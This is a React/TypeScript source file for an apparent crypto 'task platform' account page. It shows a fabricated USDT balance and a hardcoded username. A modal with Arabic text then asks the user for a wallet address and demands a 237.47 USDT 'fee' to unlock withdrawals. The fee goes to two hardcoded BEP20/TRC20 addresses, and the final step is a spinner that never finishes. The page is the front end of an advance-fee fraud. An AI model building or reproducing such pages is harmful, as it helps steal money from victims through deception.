
import React, { useState } from 'react';
import { MessageIcon, ActionIcon, FeatureIcon, NavIcon } from './components/Icons.tsx';

const App: React.FC = () => {
  const [modalStep, setModalStep] = useState<number>(1); 
  const [walletInput, setWalletInput] = useState('');
  const [copiedText, setCopiedText] = useState<string | null>(null);

  const nextStep = () => setModalStep(prev => prev + 1);

  const handleCopy = (text: string) => {
    navigator.clipboard.writeText(text);
    setCopiedText(text);
    setTimeout(() => setCopiedText(null), 2000);
  };

  return (
    <div className="relative max-w-[430px] mx-auto overflow-hidden min-h-screen">
      {/* Main Content with subtle blur when modal is active */}
      <div className={`flex flex-col min-h-screen bg-[#F7F8FA] relative pb-24 overflow-x-hidden transition-all duration-300 ${modalStep > 0 ? 'blur-[2px] pointer-events-none' : ''}`}>
        {/* Header Section */}
        <header className="bg-gradient-to-r from-[#9B4A4E] to-[#7C4A50] px-5 pt-12 pb-10 text-white relative">
          <div className="absolute top-10 right-6 cursor-pointer">
            <MessageIcon />
          </div>

          <div className="flex items-center space-x-4">
            <div className="w-16 h-16 rounded-full bg-white overflow-hidden shadow-sm flex items-center justify-center relative">
              <svg viewBox="0 0 100 100" className="w-[85%] h-[85%]">
                <defs>
                  <path id="pentagon" d="M50 15 L80 35 L70 70 L30 70 L20 35 Z" />
                </defs>
                <use href="#pentagon" fill="#E35050" transform="translate(0, -22) scale(0.6) translate(-50, -50) translate(83, 83)" />
                <use href="#pentagon" fill="#ECC131" transform="rotate(72, 50, 50) translate(0, -22) scale(0.6) translate(-50, -50) translate(83, 83)" />
                <use href="#pentagon" fill="#9959B7" transform="rotate(144, 50, 50) translate(0, -22) scale(0.6) translate(-50, -50) translate(83, 83)" />
                <use href="#pentagon" fill="#3590B5" transform="rotate(216, 50, 50) translate(0, -22) scale(0.6) translate(-50, -50) translate(83, 83)" />
                <use href="#pentagon" fill="#5EB36A" transform="rotate(288, 50, 50) translate(0, -22) scale(0.6) translate(-50, -50) translate(83, 83)" />
              </svg>
            </div>
            <div>
              <div className="flex items-center space-x-2">
                <span className="text-[24px] font-bold">muyy98</span>
                <div className="bg-[#F5B400] text-white italic text-[10px] px-1.5 py-0.5 rounded-[6px] font-black leading-none h-4 flex items-center justify-center">
                  VIP 3
                </div>
              </div>
              <div className="text-[13px] opacity-90 mt-0.5 font-normal">
                Invitation code: 254341
              </div>
            </div>
          </div>

          <div className="mt-10 flex justify-between items-end">
            <div className="flex flex-col">
              <span className="text-[14px] font-semibold mb-1 opacity-90">My Account</span>
              <div className="flex items-baseline space-x-1.5">
                <span className="text-[13px] font-bold">USDT</span>
                <span className="text-[28px] font-bold leading-none tracking-tight">3078.5533</span>
              </div>
            </div>
            
            <div className="flex space-x-6 mr-1">
              <div className="flex flex-col items-center">
                <div className="bg-[#F5F5F5] w-[54px] h-[54px] rounded-[20px] flex items-center justify-center shadow-sm">
                  <ActionIcon type="deposit" />
                </div>
                <span className="text-[12px] mt-2 font-medium opacity-90">Deposit</span>
              </div>
              <div className="flex flex-col items-center">
                <div className="bg-[#F5F5F5] w-[54px] h-[54px] rounded-[20px] flex items-center justify-center shadow-sm">
                  <ActionIcon type="withdraw" />
                </div>
                <span className="text-[12px] mt-2 font-medium opacity-90">Withdrawal</span>
              </div>
            </div>
          </div>
        </header>

        <section className="bg-white py-5 flex justify-around border-b border-gray-50">
          <FeatureItem label="Teams" type="teams" />
          <FeatureItem label="Record" type="record" />
          <FeatureItem label="Wallet management" type="wallet" />
          <FeatureItem label="Invite friends" type="invite" />
        </section>

        <section className="p-4 flex-grow">
          <div className="bg-white rounded-[16px] shadow-sm overflow-hidden">
            <MenuListItem icon={<ListIcon type="profile" />} label="Profile" />
            <MenuListItem icon={<ListIcon type="deposit_records" />} label="Deposit records" />
            <MenuListItem icon={<ListIcon type="withdraw_records" />} label="Withdrawal records" />
            <MenuListItem icon={<ListIcon type="setting" />} label="Setting" />
          </div>
        </section>

        <nav className="fixed bottom-0 left-0 right-0 max-w-[430px] mx-auto bg-white border-t border-gray-100 flex justify-around py-2.5 z-50">
          <NavItem label="Home" type="home" active={false} />
          <NavItem label="Service" type="service" active={false} />
          <NavItem label="Menu" type="menu" active={false} />
          <NavItem label="Record" type="record" active={false} />
          <NavItem label="Mine" type="mine" active={true} />
        </nav>
      </div>

      {/* Modal Overlay System */}
      {modalStep > 0 && (
        <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/40 backdrop-blur-[1px] p-6">
          <div className="bg-white w-full max-w-[360px] rounded-[28px] p-6 shadow-2xl animate-in fade-in zoom-in duration-300 flex flex-col items-center text-center">
            
            {/* Step 1: Welcome */}
            {modalStep === 1 && (
              <>
                <div className="w-16 h-16 bg-blue-50 rounded-full flex items-center justify-center mb-4">
                  <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#4B81F2" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
                </div>
                <p className="text-[#333] text-[16px] leading-relaxed font-medium dir-rtl mb-6">
                  أهلاً بك <span className="text-blue-600 font-bold">muyy98</span> تم حل أمر المهام ضمن اتفاق برتكول بين منصتنا ومنصة <span className="font-bold">mini pro</span>. اضغط التالي.
                </p>
                <button onClick={nextStep} className="w-full bg-[#4B81F2] text-white font-bold py-4 rounded-[16px] active:scale-95 transition-transform shadow-lg shadow-blue-200">التالي</button>
              </>
            )}

            {/* Step 2: Wallet Input */}
            {modalStep === 2 && (
              <>
                <h3 className="text-[18px] font-bold mb-4 text-[#333]">إدخال عنوان المحفظة</h3>
                <input 
                  type="text" 
                  placeholder="ضع رابط محفظتك هنا..." 
                  value={walletInput}
                  onChange={(e) => setWalletInput(e.target.value)}
                  className="w-full bg-gray-50 border border-gray-200 rounded-[16px] px-4 py-4 mb-6 text-center outline-none focus:border-blue-400 transition-colors text-[14px]"
                />
                <button 
                  onClick={nextStep}
                  disabled={!walletInput}
                  className="w-full bg-[#4B81F2] text-white font-bold py-4 rounded-[16px] active:scale-95 transition-transform disabled:opacity-50 shadow-lg shadow-blue-200"
                >
                  التالي
                </button>
              </>
            )}

            {/* Step 3: Deposit/Tax Instructions */}
            {modalStep === 3 && (
              <div className="w-full text-right" dir="rtl">
                <p className="text-[15px] text-[#333] leading-relaxed mb-3">
                  أهلاً بك <span className="font-bold">muyy98</span> بقي أمر إيداع مبلغ <span className="text-red-500 font-extrabold text-[18px]">237.47</span> عملة USDT لفتح قناة السحب.
                </p>
                
                <p className="text-[14px] text-blue-800 font-bold bg-blue-50/80 p-4 rounded-[18px] mb-5 leading-relaxed border border-blue-100 shadow-sm">
                   ✨ بمجرد إتمام عملية دفع الرسوم، ستتمكن من سحب كامل رصيدك المتوفر بشكل آمن وتلقائي خلال فترة تتراوح بين <span className="underline decoration-blue-400">10 إلى 30 دقيقة</span> كحد أقصى.
                </p>

                <div className="space-y-3 mb-6">
                  {/* USDT BEP20 */}
                  <div className="bg-gray-50 p-3.5 rounded-[18px] border border-gray-100 relative shadow-sm">
                    <div className="flex items-center justify-between mb-2">
                       <div className="flex items-center">
                          <div className="w-7 h-7 bg-[#f3ba2f] rounded-full flex items-center justify-center p-1 shadow-sm">
                             <svg viewBox="0 0 24 24" fill="white"><path d="M16.624 13.9202l-4.624 4.624-4.624-4.624-1.376 1.376 6 6 6-6zM12 2l-6 6 1.376 1.376 4.624-4.624 4.624 4.624 1.376-1.376zM12 14.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5z"/></svg>
                          </div>
                          <span className="text-[11px] font-bold text-gray-700 mr-2">USDT BEP 20 (BSC)</span>
                       </div>
                       <button onClick={() => handleCopy('0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d')} className="p-2 bg-white rounded-xl shadow-sm active:scale-90 transition-all border border-gray-50">
                        {copiedText === '0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d' ? <span className="text-[10px] text-green-500 font-bold px-1">تم النسخ</span> : <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#4B81F2" strokeWidth="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>}
                      </button>
                    </div>
                    <div className="text-[11px] font-mono break-all text-gray-400 bg-white/50 p-2 rounded-lg border border-dashed border-gray-200">
                      0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d
                    </div>
                  </div>

                  {/* TRON TRC20 */}
                  <div className="bg-gray-50 p-3.5 rounded-[18px] border border-gray-100 relative shadow-sm">
                    <div className="flex items-center justify-between mb-2">
                       <div className="flex items-center">
                          <div className="w-7 h-7 bg-[#ef0027] rounded-full flex items-center justify-center p-1 shadow-sm">
                             <svg viewBox="0 0 24 24" fill="white"><path d="M12 2L2 19.74L12 22L22 19.74L12 2Z"/></svg>
                          </div>
                          <span className="text-[11px] font-bold text-gray-700 mr-2">Tron TRC 20 (TRX)</span>
                       </div>
                       <button onClick={() => handleCopy('TXNSwDcprucSrrpyC6kLGLNrfiwHSRD8ai')} className="p-2 bg-white rounded-xl shadow-sm active:scale-90 transition-all border border-gray-50">
                        {copiedText === 'TXNSwDcprucSrrpyC6kLGLNrfiwHSRD8ai' ? <span className="text-[10px] text-green-500 font-bold px-1">تم النسخ</span> : <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#4B81F2" strokeWidth="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>}
                      </button>
                    </div>
                    <div className="text-[11px] font-mono break-all text-gray-400 bg-white/50 p-2 rounded-lg border border-dashed border-gray-200">
                      TXNSwDcprucSrrpyC6kLGLNrfiwHSRD8ai
                    </div>
                  </div>
                </div>

                <button 
                  onClick={nextStep}
                  className="w-full bg-[#4B81F2] text-white font-bold py-4 rounded-[18px] active:scale-95 transition-transform shadow-lg shadow-blue-200 mb-2"
                >
                  تم الإيداع، تفعيل قناة السحب
                </button>
              </div>
            )}

            {/* Step 4: Verification Wait */}
            {modalStep === 4 && (
              <>
                <div className="mb-6">
                  <div className="w-16 h-16 border-[5px] border-blue-500 border-t-transparent rounded-full animate-spin mx-auto shadow-sm"></div>
                </div>
                <p className="text-[#333] text-[18px] font-bold mb-2">جاري تأكيد الشبكة...</p>
                <p className="text-gray-500 text-[14px] leading-relaxed px-2">الرجاء عدم إغلاق هذه الصفحة، نقوم حالياً بمراجعة عملية الإيداع عبر البلوكشين لتفعيل السحب الفوري لحسابك.</p>
                <div className="mt-8 h-8"></div>
              </>
            )}

          </div>
        </div>
      )}
    </div>
  );
};

const FeatureItem: React.FC<{ label: string; type: any }> = ({ label, type }) => (
  <div className="flex flex-col items-center w-1/4 cursor-pointer active:opacity-70">
    <div className="mb-1.5">
      <FeatureIcon type={type} />
    </div>
    <span className="text-[12px] text-gray-700 text-center font-medium leading-tight px-1">{label}</span>
  </div>
);

const MenuListItem: React.FC<{ icon: React.ReactNode; label: string }> = ({ icon, label }) => (
  <div className="flex items-center justify-between px-5 py-5 border-b border-gray-50 last:border-b-0 active:bg-gray-50 cursor-pointer">
    <div className="flex items-center space-x-4">
      <div className="opacity-70">{icon}</div>
      <span className="text-[15px] text-gray-800 font-medium">{label}</span>
    </div>
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#BBBBBB" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
      <polyline points="9 18 15 12 9 6"></polyline>
    </svg>
  </div>
);

const NavItem: React.FC<{ label: string; type: string; active: boolean }> = ({ label, type, active }) => (
  <div className="flex flex-col items-center cursor-pointer min-w-[60px] active:opacity-70">
    <NavIcon type={type} active={active} />
    <span className={`text-[11px] mt-1 font-medium ${active ? 'text-[#333333] font-bold' : 'text-[#999999]'}`}>
      {label}
    </span>
  </div>
);

const ListIcon: React.FC<{ type: string }> = ({ type }) => {
  const size = "20";
  const color = "#90A4AE";
  switch (type) {
    case 'profile':
      return <svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke={color} strokeWidth="2.5" strokeLinecap="round"><rect x="3" y="4" width="18" height="16" rx="2" /><path d="M7 8h10M7 12h10M7 16h6" /></svg>;
    case 'deposit_records':
      return <svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke={color} strokeWidth="2.5" strokeLinecap="round"><path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2" /><rect x="8" y="2" width="8" height="4" rx="1" /></svg>;
    case 'withdraw_records':
      return <svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke={color} strokeWidth="2.5" strokeLinecap="round"><line x1="8" y1="6" x2="21" y2="6" /><line x1="8" y1="12" x2="21" y2="12" /><line x1="8" y1="18" x2="21" y2="18" /><path d="M3 6h.01M3 12h.01M3 18h.01" /></svg>;
    case 'setting':
      return <svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke={color} strokeWidth="2.5" strokeLinecap="round"><circle cx="12" cy="12" r="3" /><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z" /></svg>;
    default:
      return null;
  }
};

export default App;
